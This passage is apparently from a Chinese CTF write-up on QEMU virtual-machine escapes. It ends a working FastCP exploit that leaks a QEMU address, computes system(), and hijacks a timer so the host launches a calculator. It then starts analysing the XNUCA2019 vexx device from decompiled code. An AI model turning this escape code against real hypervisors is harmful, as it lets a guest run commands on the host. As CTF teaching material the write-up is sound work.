class="number">0x30</span>;</span><br><span class="line">    <span class="comment">//((struct FastCP_CP_INFO*)date_msg_buf) -&gt; CP_dst = phy_addr1_1+0x1000;</span></span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">0</span>) = phy_addr1_1+<span class="number">0x1000</span>;</span><br><span class="line">    printdsg((<span class="keyword">uint64_t</span>*)date_msg_buf);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,phy_addr2);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//read to userspace</span></span><br><span class="line">    <span class="comment">//((struct FastCP_CP_INFO*)date_msg_buf) -&gt; CP_cnt = 0x30;</span></span><br><span class="line">    <span class="comment">//((struct FastCP_CP_INFO*)date_msg_buf) -&gt; CP_dst = phy_addr1_1;</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">1</span>) = <span class="number">0x30</span>;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">2</span>) = phy_addr1_1;</span><br><span class="line">    printdsg((<span class="keyword">uint64_t</span>*)date_msg_buf);</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,phy_addr2);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">4</span>);</span><br><span class="line">    </span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//printdsg(userbuf);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PhyRead</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">1</span>) = cnt;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">0</span>) = src;</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,phy_addr2);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PhyWrite</span><span class="params">(<span class="keyword">uint64_t</span> dst,<span class="keyword">uint64_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">1</span>) = cnt;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">2</span>) = dst;</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,phy_addr2);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PhyCopy</span><span class="params">(<span class="keyword">uint64_t</span> src,<span class="keyword">uint64_t</span> cnt,<span class="keyword">uint64_t</span> dst)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">0x13</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">3</span>*i + <span class="number">0</span>) = src;</span><br><span class="line">        *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">3</span>*i + <span class="number">1</span>) = cnt;</span><br><span class="line">        *((<span class="keyword">uint64_t</span>*)(date_msg_buf)+<span class="number">3</span>*i + <span class="number">2</span>) = dst;</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_write(<span class="number">16</span>,<span class="number">0x11</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>,phy_addr2);</span><br><span class="line">    mmio_write(<span class="number">24</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Open and map I/O memory for the d3dev device</span></span><br><span class="line">    <span class="comment">//00:04.0</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x10000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line">        <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//init user buf</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap userbuf failed"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"userbuf: 0x%lx\n"</span>,userbuf);</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)userbuf  = <span class="number">0</span>;</span><br><span class="line">    mlock(userbuf, <span class="number">0x2000</span>);</span><br><span class="line">    phy_addr1_1 = gva_to_gpa(userbuf);</span><br><span class="line">    phy_addr1_2 = gva_to_gpa(userbuf+<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"phy_addr1_1: 0x%lx\n"</span>,phy_addr1_1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"phy_addr1_2: 0x%lx\n"</span>,phy_addr1_2);</span><br><span class="line"></span><br><span class="line">    date_msg_buf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (date_msg_buf == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap date_msg_buf failed"</span>);</span><br><span class="line">    mlock(date_msg_buf, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">uint8_t</span>*)date_msg_buf = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"date_msg_buf: 0x%lx\n"</span>,(<span class="keyword">uint8_t</span>*)date_msg_buf);</span><br><span class="line"></span><br><span class="line">    phy_addr2 = gva_to_gpa(date_msg_buf);</span><br><span class="line"></span><br><span class="line">    arbRead();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> fastcp_cp_timer_addr = *(<span class="keyword">uint64_t</span>*)(userbuf+ <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking fastcp_cp_timer: 0x%lx\n"</span>,fastcp_cp_timer_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> rebase = fastcp_cp_timer_addr<span class="number">-0x04DCE80</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking rebase: 0x%lx\n"</span>,rebase);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = rebase + <span class="number">0x02C2180</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking system_addr: 0x%lx\n"</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> fast_obj_addr = *(<span class="keyword">uint64_t</span>*)(userbuf+ <span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leaking fast_obj_addr: 0x%lx\n"</span>,fast_obj_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//write shell command</span></span><br><span class="line">    <span class="keyword">char</span> command[] = <span class="string">"gnome-calculator"</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(userbuf+<span class="number">0x10</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(userbuf+<span class="number">0x18</span>) = fast_obj_addr + <span class="number">0xA00</span>;</span><br><span class="line"></span><br><span class="line">    PhyRead(phy_addr1_1,<span class="number">0x30</span>);</span><br><span class="line">    PhyWrite(phy_addr1_1+<span class="number">0x1000</span>,<span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(userbuf,command);</span><br><span class="line">    PhyCopy(phy_addr1_1,<span class="number">0x1030</span>,phy_addr1_1);</span><br><span class="line">    <span class="comment">//trick timer</span></span><br><span class="line">    PhyRead(phy_addr1_1,<span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意</p>
<p>不加mlock不行，不加mlock，会导致物理页换出去，然后gfn转换时报错</p>
<p>mlock的作用就是锁定物理页，防止其被换出</p>
<h2 id="XNUCA2019-vxee"><a href="#XNUCA2019-vxee" class="headerlink" title="XNUCA2019 - vxee"></a>XNUCA2019 - vxee</h2><p><a href="https://github.com/ray-cp/vm-escape/tree/master/qemu-escape/xnuca-2019-vxee" target="_blank" rel="noopener">vm-escape/qemu-escape/xnuca-2019-vxee at master · ray-cp/vm-escape (github.com)</a></p>
<h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>登录用户名密码如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user: root</span><br><span class="line">pass: goodluck</span><br><span class="line">Try to escape the QEMU world!</span><br></pre></td></tr></table></figure>
<p>启动脚本，这里就可以看到设备名为vexx</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">./qemu-system-x86_64 -hda rootfs.ext2 -kernel bzImage -m 64M -append &quot;console=ttyS0 root=/dev/sda oops=panic panic=1&quot; -L ./pc-bios -netdev user,id=mynet0 -device rtl8139,netdev=mynet0 -nographic -device vexx -snapshot</span><br></pre></td></tr></table></figure>
<p>这次给的rootfs已经搞成ext2格式了，所以可以直接挂载到/mnt上修改</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop rootfs.ext2 /mnt</span><br></pre></td></tr></table></figure>
<p><strong>vexx_class_init</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ObjectClass_0 *v2; <span class="comment">// rbx</span></span><br><span class="line">  ObjectClass_0 *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v3[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>]) = <span class="number">0x11E91234</span>;</span><br><span class="line">  BYTE4(v3[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>]) = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>].unparent = (ObjectUnparent *)pci_vexx_realize;</span><br><span class="line">  v3[<span class="number">1</span>].properties = (GHashTable *)pci_vexx_uninit;</span><br><span class="line">  HIWORD(v3[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>]) = <span class="number">255</span>;</span><br><span class="line">  v2[<span class="number">1</span>].type = (Type)((<span class="keyword">unsigned</span> __int64)v2[<span class="number">1</span>].type | <span class="number">0x80</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里有用的就是得到vendor号是0x11E91234</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lspci</span></span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:11e9</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 10ec:8139</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br></pre></td></tr></table></figure>
<p>进一步得到PCI号 00:04.0</p>
<p>还好程序保留了vexx结构体对象的符号</p>
<p><img src="/2022/05/04/QemuPwn前进四/image-20220501182647809.png" alt="image-20220501182647809"></p>
<p><strong>pci_vexx_realize</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">pci_vexx_realize</span><span class="params">(VexxState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  VexxState *vexxObj; <span class="comment">// rbx</span></span><br><span class="line">  MemoryRegion_0 *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  vexxObj = (VexxState *)object_dynamic_cast_assert(</span><br><span class="line">                           &amp;pdev-&gt;pdev.qdev.parent_obj,</span><br><span class="line">                           <span class="string">"vexx"</span>,</span><br><span class="line">                           <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>,</span><br><span class="line">                           <span class="number">482</span>,</span><br><span class="line">                           <span class="string">"pci_vexx_realize"</span>);</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_full(&amp;vexxObj-&gt;vexxdma.dma_timer, <span class="number">0L</span>L, QEMU_CLOCK_VIRTUAL, <span class="number">1000000</span>, <span class="number">0</span>, vexx_dma_timer, vexxObj);</span><br><span class="line">    qemu_mutex_init(&amp;vexxObj-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;vexxObj-&gt;thr_cond);</span><br><span class="line">    qemu_thread_create(&amp;vexxObj-&gt;thread, <span class="string">"vexx"</span>, vexx_fact_thread, vexxObj, <span class="number">0</span>);</span><br><span class="line">    memory_region_init_io(</span><br><span class="line">      &amp;vexxObj-&gt;mmio,</span><br><span class="line">      &amp;vexxObj-&gt;pdev.qdev.parent_obj,</span><br><span class="line">      &amp;vexx_mmio_ops,</span><br><span class="line">      vexxObj,</span><br><span class="line">      <span class="string">"vexx-mmio"</span>,</span><br><span class="line">      <span class="number">0x1000</span>uLL);</span><br><span class="line">    memory_region_init_io(&amp;vexxObj-&gt;cmb, &amp;vexxObj-&gt;pdev.qdev.parent_obj, &amp;vexx_cmb_ops, vexxObj, <span class="string">"vexx-cmb"</span>, <span class="number">0x4000</span>uLL);</span><br><span class="line">    portio_list_init(&amp;vexxObj-&gt;port_list, &amp;vexxObj-&gt;pdev.qdev.parent_obj, vexx_port_list, vexxObj, <span class="string">"vexx"</span>);</span><br><span class="line">    v3 = pci_address_space_io(&amp;pdev-&gt;pdev);</span><br><span class="line">    portio_list_add(&amp;vexxObj-&gt;port_list, v3, <span class="number">0x230</span>u);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">0</span>, &amp;vexxObj-&gt;mmio);</span><br><span class="line">    pci_register_bar(&amp;pdev-&gt;pdev, <span class="number">1</span>, <span class="number">4u</span>, &amp;vexxObj-&gt;cmb);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里注册了很多东西，一个定时器vexx_dma_timer，一个新线程vexx_fact_thread</p>
<p>注册了两个mmio，vexx_cmb和vexx_mmio,还有一个PMIO</p>
<p>下面得逐一分析下这几个函数</p>
<p><strong>vexx_mmio_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">vexx_mmio_read</span><span class="params">(VexxState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">36</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;irq_status;</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vexxdma.dma.dst;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x88</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr != <span class="number">144</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">152</span> )</span><br><span class="line">          <span class="keyword">return</span> opaque-&gt;vexxdma.dma.cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vexxdma.dma.cnt;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">128</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vexxdma.dma.src;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    <span class="keyword">return</span> opaque-&gt;addr4;</span><br><span class="line">  <span class="keyword">if</span> ( addr &lt;= <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xDEADBEEF</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( addr != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;status;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  qemu_mutex_lock_func(&amp;opaque-&gt;thr_mutex, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">220</span>);</span><br><span class="line">  v4 = opaque-&gt;fact;</span><br><span class="line">  qemu_mutex_unlock_impl(&amp;opaque-&gt;thr_mutex, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">222</span>);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>vexx_mmio_read可以读取dma的相关值（vexxdma.dma.dst  /  vexxdma.dma.cmd  / vexxdma.dma.cnt  /  vexxdma.dma.src  / opaque-&gt;addr4  /  opaque-&gt;status）</p>
<p><strong>vexx_fact_thread</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">fastcall <span class="title">vexx_fact_thread</span><span class="params">(VexxState *vexxObj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *v1; <span class="comment">// r12</span></span><br><span class="line">  QemuMutex_0 *v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// er15</span></span><br><span class="line"></span><br><span class="line">  v1 = (<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;vexxObj-&gt;status;</span><br><span class="line">  v2 = &amp;vexxObj-&gt;thr_mutex;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    qemu_mutex_lock_func(v2, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">442</span>);</span><br><span class="line">    <span class="keyword">while</span> ( (*v1 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( vexxObj-&gt;stopping )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      qemu_cond_wait_func(&amp;vexxObj-&gt;thr_cond, v2, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">445</span>);<span class="comment">// 等待cond</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( vexxObj-&gt;stopping )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = vexxObj-&gt;fact;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">    qemu_mutex_unlock_impl(v2, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">454</span>);</span><br><span class="line">    <span class="keyword">for</span> ( ; v3; --v3 )</span><br><span class="line">      v4 *= v3;</span><br><span class="line">    qemu_mutex_lock_func(v2, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">465</span>);</span><br><span class="line">    vexxObj-&gt;fact = v4;                         <span class="comment">// 计算fact</span></span><br><span class="line">    qemu_mutex_unlock_impl(v2, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">467</span>);</span><br><span class="line">    _InterlockedAnd(v1, <span class="number">0xFFFFFFFE</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (*v1 &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      qemu_mutex_lock_iothread_impl(<span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">471</span>);</span><br><span class="line">      vexxObj-&gt;irq_status |= <span class="number">1u</span>;</span><br><span class="line">      vexx_raise_irq(vexxObj, <span class="number">0x1D7</span>u);</span><br><span class="line">      qemu_mutex_unlock_iothread();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">  qemu_mutex_unlock_impl(v2, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">449</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fact_thread好像就是等待线程信号，然后计算了一下fact(幂乘)</p>
<p><strong>vexx_mmio_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_mmio_write</span><span class="params">(VexxState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span 